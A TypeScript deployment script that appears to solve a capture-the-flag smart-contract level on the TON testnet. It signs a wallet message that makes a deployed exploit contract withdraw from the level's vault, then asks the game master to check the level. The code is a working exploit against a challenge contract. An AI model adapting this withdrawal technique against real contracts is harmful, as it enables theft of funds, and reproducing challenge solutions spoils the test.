import { KeyPair, mnemonicToPrivateKey, sign } from '@ton/crypto';
import { Address, beginCell, Cell, external, toNano } from '@ton/core';
import { NetworkProvider } from '@ton/blueprint';
import { PartialLevelExploit } from '../wrappers/wrappers/PartialLevelExploit';
import { PartialLevel } from '../wrappers/wrappers/PartialLevel';

//  yarn blueprint run 5.PartialLevelExploit --testnet --mnemonic
export async function run(provider: NetworkProvider) {
    const level_addr = Address.parse('EQCvzLEtvrVETBEaDR3fd4otwgAX801xYk1svgonqqXWnnhm');
    const wallet_addr = Address.parse('0QCfWnJsn6EObZIpyynLFgEI__C5qX4l_WsiaokAZuDW7bT2');
    const game_master_addr = Address.parse('kQBIdaDsXQ13Gbddcgi7Vl_9DfyB17sUkJylYqx-OqZWPya0');
    const exploit = provider.open(await PartialLevelExploit.fromInit());

    const wallet = provider.open(PartialLevel.fromAddress(wallet_addr));

    const mnemonic = process.env.WALLET_MNEMONIC;
    const mnemonic_arr: string[] = mnemonic!.split(/\s+/);

    const keys: KeyPair = await mnemonicToPrivateKey(mnemonic_arr);

    const subwallet_id: bigint = 698983191n;
    const valid_until: bigint = BigInt(Math.floor(Date.now() / 1000) + 1000);
    const msg_seqno: bigint = 408n;

    const sendCheck = beginCell()
        .storeUint(0x18, 6)
        .storeAddress(game_master_addr)
        .storeCoins(toNano('0.15'))
        .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .storeRef(
            beginCell().storeUint(0xbcea8a60, 32).storeRef(beginCell().storeStringTail('partial').endCell()).endCell(),
        )
        .endCell();

    const sendWithdrawFromVault = beginCell()
        .storeUint(0x18, 6)
        .storeAddress(exploit.address)
        .storeCoins(toNano('0.15'))
        .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .storeRef(beginCell().storeUint(0x25f7a221, 32).storeAddress(level_addr).endCell())
        .endCell();

    const body: Cell = beginCell()
        .storeUint(subwallet_id, 32)
        .storeUint(valid_until, 32)
        .storeUint(msg_seqno, 32)
        .storeUint(0, 32)
        .storeRef(sendWithdrawFromVault)
        .storeRef(sendCheck)
        .endCell();

    const signature = sign(body.hash(), keys.secretKey);

    const msgBody = beginCell().storeBuffer(signature).storeSlice(body.asSlice()).endCell();

    const res = await wallet.sendExternalSignedMessage(msgBody);

    console.log(res);
}

// Auxiliary function for sending external messages
// async function sendExternalSignedMessage(provider: ContractProvider, body: Cell) {
//     await provider.external(body);
// }
